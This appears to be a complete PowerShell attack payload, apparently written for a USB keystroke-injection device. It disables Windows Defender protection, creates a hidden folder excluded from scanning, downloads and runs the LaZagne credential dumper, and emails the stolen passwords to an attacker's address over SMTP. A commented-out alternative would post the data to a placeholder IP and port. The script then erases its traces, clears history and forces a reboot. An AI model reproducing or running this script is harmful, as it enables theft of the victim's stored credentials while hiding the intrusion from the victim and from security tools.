# Disable real time protection
Set-MpPreference -DisableRealtimeMonitoring $true
# Minimize window 
Get-Process -ID $PID | Set-WindowState -State HIDE
# Create a tmp directory in the Downloads folder
$dir = "C:\Users\$env:UserName\Downloads\tmp"
New-Item -ItemType Directory -Path $dir
# Add an exception to Windows Defender for the tmp directory
Add-MpPreference -ExclusionPath $dir
#Hide the directory
$hide = Get-Item $dir -Force
$hide.attributes='Hidden'
# Download the executable
Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "$dir\lazagne.exe"
# Execute the executable and save output to a file
 "$dir\lazagne.exe" all > "$dir\output.txt"

# Exfiltrate the file
#POST REQUEST
#Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"

#Mail Exfiltration
$smtp = "smtp.gmail.com" # Put SMTP SERVER HERE, TESTED WITH GOOGLES
$From = "henklaka@gmail.com" # Put the SENDER HERE
$To = "henklaka@gmail.com" # Put the RECEIVER HERE
$smtp = "smtp.gmail.com" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
$Subject = "Ducky Rapport"
$Body = "Hi, here is the Rapport"

# The password is an app-specific password if you have 2-factor-auth enabled
$Password = "" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
# The smtp server used to send the file
Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -port 587 -UseSsl -Credential $Credential

# Clean up
Remove-Item -Path $dir -Recurse -Force
Set-MpPreference -DisableRealtimeMonitoring $false
Remove-MpPreference -ExclusionPath $dir

# Remove the script from the system
Clear-History

# Reboot the system
Restart-Computer -Force
